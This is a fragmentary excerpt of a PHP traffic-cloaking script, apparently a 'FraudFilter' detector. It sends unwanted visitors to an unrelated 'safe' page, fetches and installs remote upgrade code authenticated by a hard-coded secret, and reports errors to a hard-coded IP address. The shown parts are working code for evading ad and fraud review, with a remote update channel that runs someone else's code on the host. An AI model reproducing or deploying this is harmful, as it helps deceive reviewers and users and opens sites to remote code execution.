...
class FraudFilterDetector_3irkr {
    ...
    function isSignatureValid($sign, $time) {
        $str = '9ca5543b-4331-4b3a-ad3d-6b8967804671.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.ifo.de/en/node/25365');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 9ca5543b-4331-4b3a-ad3d-6b8967804671',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 9ca5543b-4331-4b3a-ad3d-6b8967804671';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 9ca5543b-4331-4b3a-ad3d-6b8967804671';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=3irkr&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_3irkr = new FraudFilterDetector_3irkr();
$fraudFilterDetector_3irkr->check();
